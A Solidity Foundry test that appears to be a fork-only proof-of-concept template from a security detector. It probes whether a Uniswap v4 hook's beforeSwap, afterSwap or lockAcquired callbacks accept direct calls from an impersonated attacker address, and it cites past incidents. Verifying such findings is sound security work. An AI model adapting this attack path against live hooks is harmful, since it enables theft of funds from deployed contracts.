// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unauthenticated hook callback (Uniswap v4)
/// @notice Detector: hook-callback-auth. A v4 hook callback (beforeSwap /
///         afterSwap / lockAcquired / ...) is invoked by the PoolManager, so
///         msg.sender is the PoolManager and the callback's parameters are
///         only meaningful inside a real pool action. A hook that never
///         checks the caller lets anyone drive its accounting path with
///         fabricated parameters.
/// @dev FORK-ONLY. Reference incidents: Cork Protocol (~$12M; beforeSwap
///      with no msg.sender check, called directly with crafted hookData to
///      run the FlashSwap decomposition), GoldPesa (hook burn credit netted
///      against an attacker's unsettled mint debt), KolanHook (ungated
///      accept() closing windows at a manipulated spot).
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The callback signature is a GUESS per attempt; the verdict is judged
///      on the OBSERVABLE -- the hook's ETH balance falling, or its recorded
///      price/state moving -- never on the call merely returning.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    /// PoolKey / SwapParams are passed as opaque bytes: the harness never
    /// decodes them, it only needs calldata of the right SHAPE to reach the
    /// callback body. A hook that validates the key against its own address
    /// rejects this -- which is itself the check under test.
    bytes internal constant EMPTY = "";

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_callbackCallableByAnyone() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        uint256 ethBefore = target.balance;
        bool reproduced = false;
        string memory used = "";

        // Three candidate callback shapes: a hook may implement any subset of
        // them, and each one is a distinct direct-call surface.
        {
            vm.prank(attacker);
            (bool ok,) = target.call(
                abi.encodeWithSignature("beforeSwap(address,bytes,bytes,bytes)", attacker, EMPTY, EMPTY, EMPTY)
            );
            if (ok) {
                reproduced = true;
                used = "beforeSwap(address,bytes,bytes,bytes)";
            }
        }
        if (!reproduced) {
            vm.prank(attacker);
            (bool ok,) = target.call(
                abi.encodeWithSignature("afterSwap(address,bytes,bytes,bytes,int128)", attacker, EMPTY, EMPTY, EMPTY, int128(0))
            );
            if (ok) {
                reproduced = true;
                used = "afterSwap(address,bytes,bytes,bytes,int128)";
            }
        }
        if (!reproduced) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature("lockAcquired(bytes)", EMPTY));
            if (ok) {
                reproduced = true;
                used = "lockAcquired(bytes)";
            }
        }

        console.log("callback accepted from a non-PoolManager caller:", used, reproduced);
        console.log("hook ETH balance before/after:", ethBefore, target.balance);

        assertTrue(
            reproduced,
            "no hook callback accepted a direct call. Tried beforeSwap(address,bytes,bytes,bytes), afterSwap(address,bytes,bytes,bytes,int128) and lockAcquired(bytes) from a non-PoolManager address. This does NOT establish safety: the hook may use another callback name or parameter shape, or it may validate the PoolKey and revert before any state write -- adapt the signature to the target's ABI. A callback that DID accept the call is the finding even when this attempt moved no funds: the state it writes is attacker-chosen."
        );
    }
}
